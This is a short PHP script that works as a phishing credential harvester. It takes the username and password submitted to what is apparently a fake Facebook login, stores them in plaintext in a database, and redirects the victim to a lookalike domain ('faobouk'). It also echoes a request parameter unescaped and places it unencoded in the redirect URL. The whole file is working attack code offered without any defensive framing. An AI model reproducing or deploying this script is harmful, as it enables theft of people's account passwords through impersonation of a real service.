<?php
try {
    $bdd = new PDO('mysql:host=localhost;dbname=lock;charset=utf8', 'root', '');

    echo 'base ook';
} catch (Exception $e) {
    die('Erreur : ' . $e->getMessage());
}


if (isset($_POST["username"])&& !empty($_POST["username"]) && isset($_POST["password"]) && !empty($_POST["password"]))
{
$ma_date =date('Y-m-d H:m:s');
echo $ma_date;
    // Insertion de l'user à l'aide d'une requête préparée
    $req = $bdd->prepare('INSERT INTO user (username, password, createdAt) VALUES(?, ?, ?)');
    $req->execute(array($_POST['username'], $_POST['password'],$ma_date));
    echo 'insertion ook';
}


// Redirection du visiteur vers la page de facebook

//header('Location: http://https://www.facebook.com/login/');
echo $_POST['usr'];

header('Location: https://faobouk.000webhostapp.com/php/vivenoel/noel.php?usr='.$_POST['usr'].'');
$req->closeCursor();

?>